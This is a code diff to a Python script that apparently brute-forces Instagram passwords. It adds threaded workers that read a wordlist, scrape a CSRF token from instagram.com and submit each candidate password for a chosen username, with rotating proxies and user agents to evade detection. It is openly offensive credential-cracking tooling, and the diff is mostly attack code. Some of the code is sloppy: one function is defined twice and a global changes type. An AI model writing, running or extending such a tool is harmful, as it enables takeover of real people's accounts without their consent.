@@ -5,6 +5,7 @@ import argparse
 import time
 import socket
 import threading
+import traceback
 
 try:
     import Queue
@@ -12,6 +13,9 @@ except ImportError:
     import queue as Queue
 
 THREAD = 4
+
+
+
 
 class bcolors:
     HEADER = '\033[94m'
@@ -58,7 +62,7 @@ def extract_csrf_token(text):
 
 
 
-def craft_response(username, password, csrf_token):
+def craft_response(username, password, csrf_token, proxy):
 
   user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
@@ -101,8 +105,9 @@ def craft_response(username, password, csrf_token):
   proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
   opener = rq.build_opener(proxy_support)
   rq.install_opener(opener)
-
   """
+
+  
 
   data = http_parser.urlencode(values)
   data = data.encode('ascii')
@@ -169,10 +174,9 @@ def check_avalaible_proxys(proxys):
     """
     socket.setdefaulttimeout(30)
 
-    global proxys_working_list
+    #global proxys_working_list
     print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)
 
-    proxys_working_list = {}
     max_thread = THREAD
 
     queue = Queue.Queue()
@@ -228,12 +232,121 @@ def check_proxy(q):
                 print(logger.error(err))
             pass  
 
+def brute(q):
+    """
+    main worker function
+    :param word:
+    :param event:
+    :return:
+    """
+    if not q.empty():
+        try:
+            proxy = None
+
+            if len(proxys_working_list) != 0:
+                proxy = random.choice(list(proxys_working_list.keys()))
+
+            word = q.get()
+            word = word.replace("\r", "").replace("\n", "")
+
+            #craft request with proxy
+
+            response = rq.urlopen('http://www.instagram.com')
+            html = response.read()
+
+            csrf_token = extract_csrf_token(html)
+
+
+            password = word.strip()
+
+            craft_response(username, password, csrf_token, proxy)
+
+        except Exception as error:
+          print(traceback.print_exc())
+
+
+
+            
+def starter():
+    """
+    threading workers initialize
+    """
+    global found_flag
+
+    queue = Queue.Queue()
+    threads = []
+    max_thread = THREAD
+    found_flag = False
+
+    queuelock = threading.Lock()
+
+    print(bcolors.HEADER + "\n[!] Initializing Workers")
+    print("[!] Start Cracking ... \n" + bcolors.ENDC)
+
+    try:
+        for word in words:
+            queue.put(word)
+        while not queue.empty():
+            queuelock.acquire()
+            for workers in range(max_thread):
+                t = threading.Thread(target=brute, args=(queue,))
+                t.setDaemon(True)
+                t.start()
+                threads.append(t)
+            for t in threads:
+                t.join()
+            queuelock.release()
+            if found_flag:
+                break
+        print(bcolors.OKGREEN + "\n--------------------")
+        print("[!] Brute complete !" + bcolors.ENDC)
+
+    except Exception as err:
+        print(err)
+
+def get_csrf():
+
+  global csrf_token
+
+
+  response = rq.urlopen('http://www.instagram.com')
+  html = response.read()
+
+  csrf_token = extract_csrf_token(html)
+
+  print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
+
+
+
+def extract_csrf_token(text):
+
+  page_text = str(text)
+
+  result = page_text.find("csrf_token")
+  after = page_text[result + len("csrf_token"):-1]
+
+
+  csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")
+
+  if len(csrf_token) == 0:
+    print ("[-] Error extraction CSRF token, exiting...")
+    exit()
+  else:
+
+    #print ("CSRF token is: " + csrf_token)
+    return csrf_token
+
+
 
 
 
 
 if __name__ == "__main__":
 
+
+  global proxys_working_list
+
+  proxys_working_list = []
 
   # Parse args
   parser = argparse.ArgumentParser(
@@ -252,7 +365,8 @@ if __name__ == "__main__":
   args = parser.parse_args()
 
   USER = args.username
-  good_proxies = []
+  global username
+  username = USER
 
   try:
       words = open(args.word).readlines()
@@ -267,10 +381,12 @@ if __name__ == "__main__":
       sys.exit(1)
 
 
-  check_avalaible_proxys(proxies)
+  #check_avalaible_proxys(proxies)
+  get_csrf()
+  starter()
 
 
-  main(USER, words)
+  #main(USER, words)
 
 
 
